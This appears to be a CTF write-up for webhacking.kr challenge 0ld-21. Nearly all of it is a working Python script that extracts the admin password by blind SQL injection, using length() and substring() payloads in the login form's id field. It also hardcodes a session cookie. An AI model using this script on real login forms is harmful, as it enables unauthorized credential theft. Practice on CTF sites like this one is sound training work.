---
title: "scripting"
published: 2026-07-27
description: "Automating Blind SQL Injection on webhacking.kr challenge 0ld-21 with Python"
tags: ["SQL Injection", "Web Security", "Python", "Automation", "CTF"]
---


This challenge (0ld-21) on webhacking.kr requires exploiting a Blind SQL Injection vulnerability in the login form. The script automates the process of extracting the administrator's password character by character.

```python
import requests
import string

# Session configuration
cookies = {
    "PHPSESSID": "537sdqf2uvc3uq4arodu70gehq",  # Your session cookie
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
}

def brute_pw_length():
    for i in range(1, 100):
        print(f"[*] Testing password length: {i}")
        
        # Injection payload to test length
        payload = {
            "id": f"admin' and length(pw) = {i} or '1'='1",
            "pw": "a",
        }

        response = requests.get(
            "https://webhacking.kr/challenge/bonus-1/index.php",
            params=payload,
            cookies=cookies,
            headers=headers,
        )
        
        # If "fail" is not in response, condition is true
        if "fail" not in response.text:
            print(f"[+] Password length found: {i}")
            return i
    
    print("[-] Password length not found!")
    return None

def brute_pw(length):
    """
    Extracts the password character by character using substring extraction.
    
    Args:
        length (int): The length of the password to extract
        
    Returns:
        str: The extracted password
    """
    password = ""
    
    # Test each position in the password
    for pos in range(1, length + 1):
        print(f"[*] Finding character at position {pos}")
        found = False
        
        # Test each printable character
        for char in string.printable:
            # Skip whitespace characters for efficiency
            if char in string.whitespace:
                continue
                
            # Injection payload to test character at current position
            payload = {
                "id": f"admin' and substring(pw, {pos}, 1) = '{char}' or '1'='1",
                "pw": "a",
            }
            
            response = requests.get(
                "https://webhacking.kr/challenge/bonus-1/index.php",
                params=payload,
                cookies=cookies,
                headers=headers,
            )
            
            # If condition is true, we found the character
            if "fail" not in response.text:
                password += char
                print(f"[+] Password so far: {password}")
                found = True
                break
        
        if not found:
            print(f"[-] No character found at position {pos}")
            return None
    
    print(f"[+] Final password: {password}")
    return password

def exploit():
    """
    Main exploit function that orchestrates the attack.
    """
    print("[*] Starting Blind SQL Injection attack...")
    
    # Step 1: Find password length
    length = brute_pw_length()
    if not length:
        return
    
    # Step 2: Extract the password
    password = brute_pw(length)
    
    if password:
        print(f"[+] Success! Admin password: {password}")
        print("[*] You can now login with:")
        print(f"    ID: admin")
        print(f"    PW: {password}")
    else:
        print("[-] Exploit failed!")

if __name__ == "__main__":
    exploit()
    ```